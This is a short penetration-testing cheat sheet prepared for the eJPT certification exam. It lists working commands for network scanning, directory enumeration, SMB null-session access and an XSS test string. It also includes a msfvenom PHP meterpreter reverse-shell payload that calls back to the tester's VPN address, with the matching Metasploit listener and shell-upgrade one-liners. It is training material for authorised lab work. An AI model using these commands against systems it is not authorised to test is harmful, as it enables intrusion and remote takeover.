# Cheat Sheet Commands for eJPT Exam

# Network Mapping

## Network Discovery Scan
```nmap -sn <target IPs/CIDR> -oN discovery.nmap```

## Enumerate live hosts

```nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open``` (practice 3)

# Enumerate Web App directories

```dirb http://targetip```

- Remember to view page source as well!!
# Web App Attacks

## XSS Examples

- Test for XSS 
`<script>alert(1)</script>` (Returns pop up window) 

# Null Session Attacks

- Check for null session
`enum4linux -n <target IP>`
- If there is a vulnerability, should see that File Server Service is active and the <20> appear in the list.

## Exploit null session

- Gather info
`enum4linux -a <target IP>`
- Use smbclient to navigate the target machine 
`smbclient -L WORKGROUP -I <target IP> -N -U ""`
- Access shares 
`smbclient \\\\<target IP>\\<share name> -N`
- SMB navigation + downloading flag to Kali
`get Congratulations.txt /root/Desktop/Congratulations.txt`


# Prep for Reverse Shell 

## msfvenom 

- Possible malware to try on Apache servers 


```msfvenom -p php/meterpreter_reverse_tcp lhost=<VPN ip> lport=53 -o meterpreter.php```

## metasploit listener set up

```use exploit/multi/handler```
```set lhost <VPN IP>```
```set payload php/meterpreter_reverse_tcp```
```set lport 53```
```run```

# After obtaining reverse shell in meterpreter

- Friendlier terminal prompt within meterpreter
`shell`
`bash -i`

- Spawn terminal 

`python -c 'import pty;pty.spawn("/bin/bash")';`

# Post Exploitation Checks 

- Always check /etc/hosts file 
- Check /var/www for flag
